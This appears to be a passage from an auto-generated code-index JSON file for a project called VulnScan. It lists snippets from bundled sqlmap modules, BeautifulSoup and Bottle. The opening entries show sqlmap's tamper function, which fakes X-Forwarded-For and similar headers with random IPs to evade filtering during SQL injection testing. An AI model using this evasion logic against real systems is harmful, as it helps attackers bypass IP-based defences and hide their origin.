        "label": "randomIP",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.xforwardedfor",
        "description": "VulnScan.modules.sqlmap.tamper.xforwardedfor",
        "peekOfCode": "def randomIP():\n    octets = []\n    while not octets or octets[0] in (10, 172, 192):\n        octets = random.sample(xrange(1, 255), 4)\n    return '.'.join(str(_) for _ in octets)\ndef tamper(payload, **kwargs):\n    \"\"\"\n    Append a fake HTTP header 'X-Forwarded-For' (and alike)\n    \"\"\"\n    headers = kwargs.get(\"headers\", {})",
        "detail": "VulnScan.modules.sqlmap.tamper.xforwardedfor",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.tamper.xforwardedfor",
        "description": "VulnScan.modules.sqlmap.tamper.xforwardedfor",
        "peekOfCode": "def tamper(payload, **kwargs):\n    \"\"\"\n    Append a fake HTTP header 'X-Forwarded-For' (and alike)\n    \"\"\"\n    headers = kwargs.get(\"headers\", {})\n    headers[\"X-Forwarded-For\"] = randomIP()\n    headers[\"X-Client-Ip\"] = randomIP()\n    headers[\"X-Real-Ip\"] = randomIP()\n    headers[\"CF-Connecting-IP\"] = randomIP()\n    headers[\"True-Client-IP\"] = randomIP()",
        "detail": "VulnScan.modules.sqlmap.tamper.xforwardedfor",
        "documentation": {}
    },
    {
        "label": "__priority__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.tamper.xforwardedfor",
        "description": "VulnScan.modules.sqlmap.tamper.xforwardedfor",
        "peekOfCode": "__priority__ = PRIORITY.NORMAL\ndef dependencies():\n    pass\ndef randomIP():\n    octets = []\n    while not octets or octets[0] in (10, 172, 192):\n        octets = random.sample(xrange(1, 255), 4)\n    return '.'.join(str(_) for _ in octets)\ndef tamper(payload, **kwargs):\n    \"\"\"",
        "detail": "VulnScan.modules.sqlmap.tamper.xforwardedfor",
        "documentation": {}
    },
    {
        "label": "ColorizingStreamHandler",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.ansistrm.ansistrm",
        "description": "VulnScan.modules.sqlmap.thirdparty.ansistrm.ansistrm",
        "peekOfCode": "class ColorizingStreamHandler(logging.StreamHandler):\n    # color names to indices\n    color_map = {\n        'black': 0,\n        'red': 1,\n        'green': 2,\n        'yellow': 3,\n        'blue': 4,\n        'magenta': 5,\n        'cyan': 6,",
        "detail": "VulnScan.modules.sqlmap.thirdparty.ansistrm.ansistrm",
        "documentation": {}
    },
    {
        "label": "stdoutEncode",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.ansistrm.ansistrm",
        "description": "VulnScan.modules.sqlmap.thirdparty.ansistrm.ansistrm",
        "peekOfCode": "def stdoutEncode(data):  # Cross-referenced function\n    return data\nclass ColorizingStreamHandler(logging.StreamHandler):\n    # color names to indices\n    color_map = {\n        'black': 0,\n        'red': 1,\n        'green': 2,\n        'yellow': 3,\n        'blue': 4,",
        "detail": "VulnScan.modules.sqlmap.thirdparty.ansistrm.ansistrm",
        "documentation": {}
    },
    {
        "label": "PageElement",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "description": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "peekOfCode": "class PageElement(object):\n    \"\"\"Contains the navigational information for some part of the page\n    (either a tag or a piece of text)\"\"\"\n    def _invert(h):\n        \"Cheap function to invert a hash.\"\n        i = {}\n        for k,v in h.items():\n            i[v] = k\n        return i\n    XML_ENTITIES_TO_SPECIAL_CHARS = { \"apos\" : \"'\",",
        "detail": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "documentation": {}
    },
    {
        "label": "NavigableString",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "description": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "peekOfCode": "class NavigableString(text_type, PageElement):\n    def __new__(cls, value):\n        \"\"\"Create a new NavigableString.\n        When unpickling a NavigableString, this method is called with\n        the string in DEFAULT_OUTPUT_ENCODING. That encoding needs to be\n        passed in to the superclass's __new__ or the superclass won't know\n        how to handle non-ASCII characters.\n        \"\"\"\n        if isinstance(value, text_type):\n            return text_type.__new__(cls, value)",
        "detail": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "documentation": {}
    },
    {
        "label": "CData",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "description": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "peekOfCode": "class CData(NavigableString):\n    def __str__(self, encoding=DEFAULT_OUTPUT_ENCODING):\n        return \"<![CDATA[%s]]>\" % NavigableString.__str__(self, encoding)\nclass ProcessingInstruction(NavigableString):\n    def __str__(self, encoding=DEFAULT_OUTPUT_ENCODING):\n        output = self\n        if \"%SOUP-ENCODING%\" in output:\n            output = self.substituteEncoding(output, encoding)\n        return \"<?%s?>\" % self.toEncoding(output, encoding)\nclass Comment(NavigableString):",
        "detail": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "documentation": {}
    },
    {
        "label": "ProcessingInstruction",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "description": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "peekOfCode": "class ProcessingInstruction(NavigableString):\n    def __str__(self, encoding=DEFAULT_OUTPUT_ENCODING):\n        output = self\n        if \"%SOUP-ENCODING%\" in output:\n            output = self.substituteEncoding(output, encoding)\n        return \"<?%s?>\" % self.toEncoding(output, encoding)\nclass Comment(NavigableString):\n    def __str__(self, encoding=DEFAULT_OUTPUT_ENCODING):\n        return \"<!--%s-->\" % NavigableString.__str__(self, encoding)\nclass Declaration(NavigableString):",
        "detail": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "documentation": {}
    },
    {
        "label": "Comment",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "description": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "peekOfCode": "class Comment(NavigableString):\n    def __str__(self, encoding=DEFAULT_OUTPUT_ENCODING):\n        return \"<!--%s-->\" % NavigableString.__str__(self, encoding)\nclass Declaration(NavigableString):\n    def __str__(self, encoding=DEFAULT_OUTPUT_ENCODING):\n        return \"<!%s>\" % NavigableString.__str__(self, encoding)\nclass Tag(PageElement):\n    \"\"\"Represents a found HTML tag with its attributes and contents.\"\"\"\n    def _convertEntities(self, match):\n        \"\"\"Used in a call to re.sub to replace HTML, XML, and numeric",
        "detail": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "documentation": {}
    },
    {
        "label": "Declaration",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "description": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "peekOfCode": "class Declaration(NavigableString):\n    def __str__(self, encoding=DEFAULT_OUTPUT_ENCODING):\n        return \"<!%s>\" % NavigableString.__str__(self, encoding)\nclass Tag(PageElement):\n    \"\"\"Represents a found HTML tag with its attributes and contents.\"\"\"\n    def _convertEntities(self, match):\n        \"\"\"Used in a call to re.sub to replace HTML, XML, and numeric\n        entities with the appropriate Unicode characters. If HTML\n        entities are being converted, any unrecognized entities are\n        escaped.\"\"\"",
        "detail": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "documentation": {}
    },
    {
        "label": "Tag",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "description": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "peekOfCode": "class Tag(PageElement):\n    \"\"\"Represents a found HTML tag with its attributes and contents.\"\"\"\n    def _convertEntities(self, match):\n        \"\"\"Used in a call to re.sub to replace HTML, XML, and numeric\n        entities with the appropriate Unicode characters. If HTML\n        entities are being converted, any unrecognized entities are\n        escaped.\"\"\"\n        try:\n            x = match.group(1)\n            if self.convertHTMLEntities and x in name2codepoint:",
        "detail": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "documentation": {}
    },
    {
        "label": "SoupStrainer",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "description": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "peekOfCode": "class SoupStrainer:\n    \"\"\"Encapsulates a number of ways of matching a markup element (tag or\n    text).\"\"\"\n    def __init__(self, name=None, attrs={}, text=None, **kwargs):\n        self.name = name\n        if isinstance(attrs, basestring):\n            kwargs['class'] = _match_css_class(attrs)\n            attrs = None\n        if kwargs:\n            if attrs:",
        "detail": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "documentation": {}
    },
    {
        "label": "ResultSet",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "description": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "peekOfCode": "class ResultSet(list):\n    \"\"\"A ResultSet is just a list that keeps track of the SoupStrainer\n    that created it.\"\"\"\n    def __init__(self, source):\n        list.__init__([])\n        self.source = source\n# Now, some helper functions.\ndef buildTagMap(default, *args):\n    \"\"\"Turns a list of maps, lists, or scalars into a single map.\n    Used to build the SELF_CLOSING_TAGS, NESTABLE_TAGS, and",
        "detail": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "documentation": {}
    },
    {
        "label": "BeautifulStoneSoup",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "description": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "peekOfCode": "class BeautifulStoneSoup(Tag, sgmllib.SGMLParser):\n    \"\"\"This class contains the basic parser and search code. It defines\n    a parser that knows nothing about tag behavior except for the\n    following:\n      You can't close a tag without closing all the tags it encloses.\n      That is, \"<foo><bar></foo>\" actually means\n      \"<foo><bar></bar></foo>\".\n    [Another possible explanation is \"<foo><bar /></foo>\", but since\n    this class defines no SELF_CLOSING_TAGS, it will never use that\n    explanation.]",
        "detail": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "documentation": {}
    },
    {
        "label": "BeautifulSoup",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "description": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "peekOfCode": "class BeautifulSoup(BeautifulStoneSoup):\n    \"\"\"This parser knows the following facts about HTML:\n    * Some tags have no closing tag and should be interpreted as being\n      closed as soon as they are encountered.\n    * The text inside some tags (ie. 'script') may contain tags which\n      are not really part of the document and which should be parsed\n      as text, not tags. If you want to parse the text as tags, you can\n      always fetch it and parse it explicitly.\n    * Tag nesting rules:\n      Most tags can't be nested at all. For instance, the occurance of",
        "detail": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "documentation": {}
    },
    {
        "label": "StopParsing",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "description": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "peekOfCode": "class StopParsing(Exception):\n    pass\nclass ICantBelieveItsBeautifulSoup(BeautifulSoup):\n    \"\"\"The BeautifulSoup class is oriented towards skipping over\n    common HTML errors like unclosed tags. However, sometimes it makes\n    errors of its own. For instance, consider this fragment:\n     <b>Foo<b>Bar</b></b>\n    This is perfectly valid (if bizarre) HTML. However, the\n    BeautifulSoup class will implicitly close the first b tag when it\n    encounters the second 'b'. It will think the author wrote",
        "detail": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "documentation": {}
    },
    {
        "label": "ICantBelieveItsBeautifulSoup",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "description": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "peekOfCode": "class ICantBelieveItsBeautifulSoup(BeautifulSoup):\n    \"\"\"The BeautifulSoup class is oriented towards skipping over\n    common HTML errors like unclosed tags. However, sometimes it makes\n    errors of its own. For instance, consider this fragment:\n     <b>Foo<b>Bar</b></b>\n    This is perfectly valid (if bizarre) HTML. However, the\n    BeautifulSoup class will implicitly close the first b tag when it\n    encounters the second 'b'. It will think the author wrote\n    \"<b>Foo<b>Bar\", and didn't close the first 'b' tag, because\n    there's no real-world reason to bold something that's already",
        "detail": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "documentation": {}
    },
    {
        "label": "MinimalSoup",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "description": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "peekOfCode": "class MinimalSoup(BeautifulSoup):\n    \"\"\"The MinimalSoup class is for parsing HTML that contains\n    pathologically bad markup. It makes no assumptions about tag\n    nesting, but it does know which tags are self-closing, that\n    <script> tags contain Javascript and should not be parsed, that\n    META tags may contain encoding information, and so on.\n    This also makes it better for subclassing than BeautifulStoneSoup\n    or BeautifulSoup.\"\"\"\n    RESET_NESTING_TAGS = buildTagMap('noscript')\n    NESTABLE_TAGS = {}",
        "detail": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "documentation": {}
    },
    {
        "label": "BeautifulSOAP",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "description": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "peekOfCode": "class BeautifulSOAP(BeautifulStoneSoup):\n    \"\"\"This class will push a tag with only a single string child into\n    the tag's parent as an attribute. The attribute's name is the tag\n    name, and the value is the string child. An example should give\n    the flavor of the change:\n    <foo><bar>baz</bar></foo>\n     =>\n    <foo bar=\"baz\"><bar>baz</bar></foo>\n    You can then access fooTag['bar'] instead of fooTag.barTag.string.\n    This is, of course, useful for scraping structures that tend to",
        "detail": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "documentation": {}
    },
    {
        "label": "RobustXMLParser",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "description": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "peekOfCode": "class RobustXMLParser(BeautifulStoneSoup):\n    pass\nclass RobustHTMLParser(BeautifulSoup):\n    pass\nclass RobustWackAssHTMLParser(ICantBelieveItsBeautifulSoup):\n    pass\nclass RobustInsanelyWackAssHTMLParser(MinimalSoup):\n    pass\nclass SimplifyingSOAPParser(BeautifulSOAP):\n    pass",
        "detail": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "documentation": {}
    },
    {
        "label": "RobustHTMLParser",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "description": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "peekOfCode": "class RobustHTMLParser(BeautifulSoup):\n    pass\nclass RobustWackAssHTMLParser(ICantBelieveItsBeautifulSoup):\n    pass\nclass RobustInsanelyWackAssHTMLParser(MinimalSoup):\n    pass\nclass SimplifyingSOAPParser(BeautifulSOAP):\n    pass\n######################################################\n#",
        "detail": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "documentation": {}
    },
    {
        "label": "RobustWackAssHTMLParser",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "description": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "peekOfCode": "class RobustWackAssHTMLParser(ICantBelieveItsBeautifulSoup):\n    pass\nclass RobustInsanelyWackAssHTMLParser(MinimalSoup):\n    pass\nclass SimplifyingSOAPParser(BeautifulSOAP):\n    pass\n######################################################\n#\n# Bonus library: Unicode, Dammit\n#",
        "detail": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "documentation": {}
    },
    {
        "label": "RobustInsanelyWackAssHTMLParser",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "description": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "peekOfCode": "class RobustInsanelyWackAssHTMLParser(MinimalSoup):\n    pass\nclass SimplifyingSOAPParser(BeautifulSOAP):\n    pass\n######################################################\n#\n# Bonus library: Unicode, Dammit\n#\n# This class forces XML data into a standard format (usually to UTF-8\n# or Unicode).  It is heavily based on code from Mark Pilgrim's",
        "detail": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "documentation": {}
    },
    {
        "label": "SimplifyingSOAPParser",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "description": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "peekOfCode": "class SimplifyingSOAPParser(BeautifulSOAP):\n    pass\n######################################################\n#\n# Bonus library: Unicode, Dammit\n#\n# This class forces XML data into a standard format (usually to UTF-8\n# or Unicode).  It is heavily based on code from Mark Pilgrim's\n# Universal Feed Parser. It does not rewrite the XML or HTML to\n# reflect a new encoding: that happens in BeautifulStoneSoup.handle_pi",
        "detail": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "documentation": {}
    },
    {
        "label": "UnicodeDammit",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "description": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "peekOfCode": "class UnicodeDammit:\n    \"\"\"A class for detecting the encoding of a *ML document and\n    converting it to a Unicode string. If the source encoding is\n    windows-1252, can replace MS smart quotes with their HTML or XML\n    equivalents.\"\"\"\n    # This dictionary maps commonly seen values for \"charset\" in HTML\n    # meta tags to the corresponding Python codec names. It only covers\n    # values that aren't in Python's aliases and can't be determined\n    # by the heuristics in find_codec.\n    CHARSET_ALIASES = { \"macintosh\" : \"mac-roman\",",
        "detail": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "documentation": {}
    },
    {
        "label": "buildTagMap",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "description": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "peekOfCode": "def buildTagMap(default, *args):\n    \"\"\"Turns a list of maps, lists, or scalars into a single map.\n    Used to build the SELF_CLOSING_TAGS, NESTABLE_TAGS, and\n    NESTING_RESET_TAGS maps out of lists and partial maps.\"\"\"\n    built = {}\n    for portion in args:\n        if hasattr(portion, 'items'):\n            #It's a map. Merge it.\n            for k,v in portion.items():\n                built[k] = v",
        "detail": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "documentation": {}
    },
    {
        "label": "__author__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "description": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "peekOfCode": "__author__ = \"Leonard Richardson (leonardr@segfault.org)\"\n__version__ = \"3.2.1\"\n__copyright__ = \"Copyright (c) 2004-2012 Leonard Richardson\"\n__license__ = \"New-style BSD\"\nimport codecs\nimport re\nimport sys\nif sys.version_info >= (3, 0):\n    xrange = range\n    text_type = str",
        "detail": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "documentation": {}
    },
    {
        "label": "__version__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "description": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "peekOfCode": "__version__ = \"3.2.1\"\n__copyright__ = \"Copyright (c) 2004-2012 Leonard Richardson\"\n__license__ = \"New-style BSD\"\nimport codecs\nimport re\nimport sys\nif sys.version_info >= (3, 0):\n    xrange = range\n    text_type = str\n    binary_type = bytes",
        "detail": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "documentation": {}
    },
    {
        "label": "__copyright__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "description": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "peekOfCode": "__copyright__ = \"Copyright (c) 2004-2012 Leonard Richardson\"\n__license__ = \"New-style BSD\"\nimport codecs\nimport re\nimport sys\nif sys.version_info >= (3, 0):\n    xrange = range\n    text_type = str\n    binary_type = bytes\n    basestring = str",
        "detail": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "documentation": {}
    },
    {
        "label": "__license__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "description": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "peekOfCode": "__license__ = \"New-style BSD\"\nimport codecs\nimport re\nimport sys\nif sys.version_info >= (3, 0):\n    xrange = range\n    text_type = str\n    binary_type = bytes\n    basestring = str\nelse:",
        "detail": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "documentation": {}
    },
    {
        "label": "sgmllib.tagfind",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "description": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "peekOfCode": "sgmllib.tagfind = re.compile('[a-zA-Z][-_.:a-zA-Z0-9]*')\nmarkupbase._declname_match = re.compile(r'[a-zA-Z][-_.:a-zA-Z0-9]*\\s*').match\nDEFAULT_OUTPUT_ENCODING = \"utf-8\"\ndef _match_css_class(str):\n    \"\"\"Build a RE to match the given CSS class.\"\"\"\n    return re.compile(r\"(^|.*\\s)%s($|\\s)\" % str)\n# First, the classes that represent markup elements.\nclass PageElement(object):\n    \"\"\"Contains the navigational information for some part of the page\n    (either a tag or a piece of text)\"\"\"",
        "detail": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "documentation": {}
    },
    {
        "label": "markupbase._declname_match",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "description": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "peekOfCode": "markupbase._declname_match = re.compile(r'[a-zA-Z][-_.:a-zA-Z0-9]*\\s*').match\nDEFAULT_OUTPUT_ENCODING = \"utf-8\"\ndef _match_css_class(str):\n    \"\"\"Build a RE to match the given CSS class.\"\"\"\n    return re.compile(r\"(^|.*\\s)%s($|\\s)\" % str)\n# First, the classes that represent markup elements.\nclass PageElement(object):\n    \"\"\"Contains the navigational information for some part of the page\n    (either a tag or a piece of text)\"\"\"\n    def _invert(h):",
        "detail": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "documentation": {}
    },
    {
        "label": "DEFAULT_OUTPUT_ENCODING",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "description": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "peekOfCode": "DEFAULT_OUTPUT_ENCODING = \"utf-8\"\ndef _match_css_class(str):\n    \"\"\"Build a RE to match the given CSS class.\"\"\"\n    return re.compile(r\"(^|.*\\s)%s($|\\s)\" % str)\n# First, the classes that represent markup elements.\nclass PageElement(object):\n    \"\"\"Contains the navigational information for some part of the page\n    (either a tag or a piece of text)\"\"\"\n    def _invert(h):\n        \"Cheap function to invert a hash.\"",
        "detail": "VulnScan.modules.sqlmap.thirdparty.beautifulsoup.beautifulsoup",
        "documentation": {}
    },
    {
        "label": "DictProperty",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "class DictProperty(object):\n    \"\"\" Property that maps to a key in a local dict-like attribute. \"\"\"\n    def __init__(self, attr, key=None, read_only=False):\n        self.attr, self.key, self.read_only = attr, key, read_only\n    def __call__(self, func):\n        functools.update_wrapper(self, func, updated=[])\n        self.getter, self.key = func, self.key or func.__name__\n        return self\n    def __get__(self, obj, cls):\n        if obj is None: return self",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "cached_property",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "class cached_property(object):\n    \"\"\" A property that is only computed once per instance and then replaces\n        itself with an ordinary attribute. Deleting the attribute resets the\n        property. \"\"\"\n    def __init__(self, func):\n        update_wrapper(self, func)\n        self.func = func\n    def __get__(self, obj, cls):\n        if obj is None: return self\n        value = obj.__dict__[self.func.__name__] = self.func(obj)",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "lazy_attribute",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "class lazy_attribute(object):\n    \"\"\" A property that caches itself to the class object. \"\"\"\n    def __init__(self, func):\n        functools.update_wrapper(self, func, updated=[])\n        self.getter = func\n    def __get__(self, obj, cls):\n        value = self.getter(cls)\n        setattr(cls, self.__name__, value)\n        return value\n###############################################################################",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "BottleException",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "class BottleException(Exception):\n    \"\"\" A base class for exceptions used by bottle. \"\"\"\n    pass\n###############################################################################\n# Routing ######################################################################\n###############################################################################\nclass RouteError(BottleException):\n    \"\"\" This is a base class for all routing related exceptions \"\"\"\nclass RouteReset(BottleException):\n    \"\"\" If raised by a plugin or request handler, the route is reset and all",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "RouteError",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "class RouteError(BottleException):\n    \"\"\" This is a base class for all routing related exceptions \"\"\"\nclass RouteReset(BottleException):\n    \"\"\" If raised by a plugin or request handler, the route is reset and all\n        plugins are re-applied. \"\"\"\nclass RouterUnknownModeError(RouteError):\n    pass\nclass RouteSyntaxError(RouteError):\n    \"\"\" The route parser found something not supported by this router. \"\"\"\nclass RouteBuildError(RouteError):",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "RouteReset",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "class RouteReset(BottleException):\n    \"\"\" If raised by a plugin or request handler, the route is reset and all\n        plugins are re-applied. \"\"\"\nclass RouterUnknownModeError(RouteError):\n    pass\nclass RouteSyntaxError(RouteError):\n    \"\"\" The route parser found something not supported by this router. \"\"\"\nclass RouteBuildError(RouteError):\n    \"\"\" The route could not be built. \"\"\"\ndef _re_flatten(p):",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "RouterUnknownModeError",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "class RouterUnknownModeError(RouteError):\n    pass\nclass RouteSyntaxError(RouteError):\n    \"\"\" The route parser found something not supported by this router. \"\"\"\nclass RouteBuildError(RouteError):\n    \"\"\" The route could not be built. \"\"\"\ndef _re_flatten(p):\n    \"\"\" Turn all capturing groups in a regular expression pattern into\n        non-capturing groups. \"\"\"\n    if '(' not in p:",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "RouteSyntaxError",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "class RouteSyntaxError(RouteError):\n    \"\"\" The route parser found something not supported by this router. \"\"\"\nclass RouteBuildError(RouteError):\n    \"\"\" The route could not be built. \"\"\"\ndef _re_flatten(p):\n    \"\"\" Turn all capturing groups in a regular expression pattern into\n        non-capturing groups. \"\"\"\n    if '(' not in p:\n        return p\n    return re.sub(r'(\\\\*)(\\(\\?P<[^>]+>|\\((?!\\?))', lambda m: m.group(0) if",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "RouteBuildError",
        "kind": 6,
